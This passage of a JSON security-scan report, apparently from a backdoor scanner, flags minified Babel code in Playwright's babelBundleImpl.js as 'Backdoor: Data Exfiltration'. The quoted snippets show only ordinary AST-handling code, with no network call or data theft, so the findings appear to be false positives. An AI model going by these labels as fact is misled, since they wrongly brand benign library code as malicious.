                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 24766,
                  "endLine": 66,
                  "endColumn": 24771,
                  "snippet": {
                    "text": "rentForPath(s.path).key>=t.key){this.attachAfter=!0,t=s.path;for(let a of s.constantViolations)this.getAttachmentParentForPath(a).key>t.key&&(t=a)}}return t}_getAttachmentPath(){let r=this.scopes.pop();if(r){if(r.path.isFunction())if(this.hasOwnParamBindings(r)){if(this.scope===r)return;let n=r.path.get(\"body\").get(\"body\");for(let s=0;s<n.length;s++)if(!n[s].node._blockHoist)return n[s]}else return this.getNextScopeAttachmentParent();else if(r.path.isProgram())return this.getNextScopeAttachmentParent()}}getNextScopeAttachmentParent(){let t=this.scopes.pop();if(t)return this.getAttachmentParentForPa",
                    "rendered": {
                      "text": "rentForPath(s.path).key>=t.key){this.attachAfter=!0,t=s.path;for(let a of s.constantViolations)this.getAttachmentParentForPath(a).key>t.key&&(t=a)}}return t}_getAttachmentPath(){let r=this.scopes.pop();if(r){if(r.path.isFunction())if(this.hasOwnParamBindings(r)){if(this.scope===r)return;let n=r.path.get(\"body\").get(\"body\");for(let s=0;s<n.length;s++)if(!n[s].node._blockHoist)return n[s]}else return this.getNextScopeAttachmentParent();else if(r.path.isProgram())return this.getNextScopeAttachmentParent()}}getNextScopeAttachmentParent(){let t=this.scopes.pop();if(t)return this.getAttachmentParentForPa",
                      "markdown": "`rentForPath(s.path).key>=t.key){this.attachAfter=!0,t=s.path;for(let a of s.constantViolations)this.getAttachmentParentForPath(a).key>t.key&&(t=a)}}return t}_getAttachmentPath(){let r=this.scopes.pop();if(r){if(r.path.isFunction())if(this.hasOwnParamBindings(r)){if(this.scope===r)return;let n=r.path.get(\"body\").get(\"body\");for(let s=0;s<n.length;s++)if(!n[s].node._blockHoist)return n[s]}else return this.getNextScopeAttachmentParent();else if(r.path.isProgram())return this.getNextScopeAttachmentParent()}}getNextScopeAttachmentParent(){let t=this.scopes.pop();if(t)return this.getAttachmentParentForPa`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 16856,
                  "endLine": 66,
                  "endColumn": 16861,
                  "snippet": {
                    "text": "llee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&&!r.get(\"body\").isBlockStatement())return!1;let n;if(r.isFunction())n=r.node.body;else if(r.isProgram())n=r.node;else return!1;for(let s of n.directives)if(s.value.value===\"use strict\")return!0})}});var rC=E(Nt=>{\"use strict\";Object.defineProperty(Nt,\"__esModule\",{value:!0});Nt._call=Lle;Nt._getQueueContext",
                    "rendered": {
                      "text": "llee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&&!r.get(\"body\").isBlockStatement())return!1;let n;if(r.isFunction())n=r.node.body;else if(r.isProgram())n=r.node;else return!1;for(let s of n.directives)if(s.value.value===\"use strict\")return!0})}});var rC=E(Nt=>{\"use strict\";Object.defineProperty(Nt,\"__esModule\",{value:!0});Nt._call=Lle;Nt._getQueueContext",
                      "markdown": "`llee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&&!r.get(\"body\").isBlockStatement())return!1;let n;if(r.isFunction())n=r.node.body;else if(r.isProgram())n=r.node;else return!1;for(let s of n.directives)if(s.value.value===\"use strict\")return!0})}});var rC=E(Nt=>{\"use strict\";Object.defineProperty(Nt,\"__esModule\",{value:!0});Nt._call=Lle;Nt._getQueueContext`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 16646,
                  "endLine": 66,
                  "endColumn": 16651,
                  "snippet": {
                    "text": "s.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&&!r.get(\"body\").isBlockStatement())return!1;let n;if(r.isFunction())n=r.node.body;else if(r.isProg",
                    "rendered": {
                      "text": "s.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&&!r.get(\"body\").isBlockStatement())return!1;let n;if(r.isFunction())n=r.node.body;else if(r.isProg",
                      "markdown": "`s.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&&!r.get(\"body\").isBlockStatement())return!1;let n;if(r.isFunction())n=r.node.body;else if(r.isProg`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 16548,
                  "endLine": 66,
                  "endColumn": 16553,
                  "snippet": {
                    "text": "eof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&",
                    "rendered": {
                      "text": "eof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&",
                      "markdown": "`eof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Ble(){return!!(this.isProgram()?this:this.parentPath).find(r=>{if(r.isProgram({sourceType:\"module\"})||r.isClass())return!0;if(r.isArrowFunctionExpression()&`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 16394,
                  "endLine": 66,
                  "endColumn": 16399,
                  "snippet": {
                    "text": "ode.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Bl",
                    "rendered": {
                      "text": "ode.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Bl",
                      "markdown": "`ode.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0})&&this.get(\"arguments\")[0].isStringLiteral():!1}function Bl`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 16299,
                  "endLine": 66,
                  "endColumn": 16304,
                  "snippet": {
                    "text": "(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope",
                    "rendered": {
                      "text": "(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope",
                      "markdown": "`(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").matchesPattern(\"Symbol.for\")&&!this.scope`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 16258,
                  "endLine": 66,
                  "endColumn": 16263,
                  "snippet": {
                    "text": "al()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").",
                    "rendered": {
                      "text": "al()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").",
                      "markdown": "`al()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:\"Symbol\"})&&!this.scope.hasBinding(\"Symbol\",{noGlobals:!0}):this.isCallExpression()?this.node.arguments.length===1&&this.get(\"callee\").`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 16123,
                  "endLine": 66,
                  "endColumn": 16128,
                  "snippet": {
                    "text": "f(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:",
                    "rendered": {
                      "text": "f(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:",
                      "markdown": "`f(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.get(\"right\").isConstantExpression()}return this.isMemberExpression()?!this.node.computed&&this.get(\"object\").isIdentifier({name:`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 15995,
                  "endLine": 66,
                  "endColumn": 16000,
                  "snippet": {
                    "text": "solve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.",
                    "rendered": {
                      "text": "solve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.",
                      "markdown": "`solve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.isUnaryExpression())return this.node.operator!==\"void\"?!1:this.get(\"argument\").isConstantExpression();if(this.isBinaryExpression()){let{operator:e}=this.node;return e!==\"in\"&&e!==\"instanceof\"&&this.get(\"left\").isConstantExpression()&&this.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 15757,
                  "endLine": 66,
                  "endColumn": 15762,
                  "snippet": {
                    "text": "ct\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.i",
                    "rendered": {
                      "text": "ct\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.i",
                      "markdown": "`ct\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLiteral()?this.get(\"expressions\").every(e=>e.isConstantExpression()):!0;if(this.i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 15679,
                  "endLine": 66,
                  "endColumn": 15684,
                  "snippet": {
                    "text": ")){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLit",
                    "rendered": {
                      "text": ")){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLit",
                      "markdown": "`)){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.name);return e?e.constant:!1}if(this.isLiteral())return this.isRegExpLiteral()?!1:this.isTemplateLit`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 15579,
                  "endLine": 66,
                  "endColumn": 15584,
                  "snippet": {
                    "text": "his.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.",
                    "rendered": {
                      "text": "his.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.",
                      "markdown": "`his.isTypeCastExpression())return this.get(\"expression\").resolve(e,t);if(e&&this.isMemberExpression()){let r=this.toComputedKey();if(!fle(r))return;let n=r.value,s=this.get(\"object\").resolve(e,t);if(s.isObjectExpression()){let i=s.get(\"properties\");for(let a of i){if(!a.isProperty())continue;let o=a.get(\"key\"),l=a.isnt(\"computed\")&&o.isIdentifier({name:n});if(l=l||o.isLiteral({value:n}),l)return a.get(\"value\").resolve(e,t)}}else if(s.isArrayExpression()&&!isNaN(+n)){let a=s.get(\"elements\")[n];if(a)return a.resolve(e,t)}}}}function kle(){if(this.isIdentifier()){let e=this.scope.getBinding(this.node.`"
